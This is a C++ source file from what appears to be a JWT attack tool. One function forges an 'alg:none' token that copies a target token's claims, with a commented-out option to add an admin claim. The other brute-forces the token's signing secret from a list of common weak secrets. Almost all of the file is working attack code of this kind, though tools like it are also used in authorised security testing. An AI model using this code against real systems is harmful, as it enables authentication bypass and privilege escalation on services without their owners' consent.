#include "attacks/attack_utils.h" // Updated path
#include "jwt-cpp/jwt.h"
#include <iostream>

void check_alg_none_vulnerability(const std::string& target_jwt){
    std::cout << "\n[*] Checking for alg:none vulnerability...\n";
    
    try{
        // Create a modified JWT with alg:none
        // We need to decode the original to get its payload claims, then re-sign with none
        auto decoded_original = jwt::decode(target_jwt);
        
        auto builder = jwt::create();
        builder.set_algorithm("none");
        
        // Copy payload claims from original token
        for(auto const& [key, json_val] : decoded_original.get_payload_json()){
            builder.set_payload_claim(key, jwt::claim(json_val));
        }
        // Optionally, add/modify claims like admin:true
        // builder.set_payload_claim("admin", jwt::claim(std::string("true")));
        
        // Sign with none algorithm
        auto modified_token = builder.sign(jwt::algorithm::none{});
        
        std::cout << "[!] Potential alg:none bypass token (claims copied from original):\n";
        std::cout << modified_token << "\n";
        std::cout << "[!] Test this token against the target application\n";
    }
    catch(const std::exception& e){
        std::cout << "[-] Could not create alg:none token: " << e.what() << "\n";
    }
}

bool check_common_secrets_attack(JWTCracker& cracker){
    std::cout << "[*] Checking common weak secrets...\n";
    
    const auto& common_secrets = cracker.getCommonSecrets();
    for(const auto& secret : common_secrets){
        if(cracker.isFound()) return true; // Already found by another attack/thread

        if(cracker.testSecret(secret)){
            cracker.setFound(secret);
            std::lock_guard<std::mutex> lock(cracker.getOutputMutex());
            std::cout << "[+] SECRET FOUND (common weak secret): '" << secret << "'\n";
            return true;
        }
    }
    
    std::cout << "[-] No common weak secrets found.\n";
    return false;
}
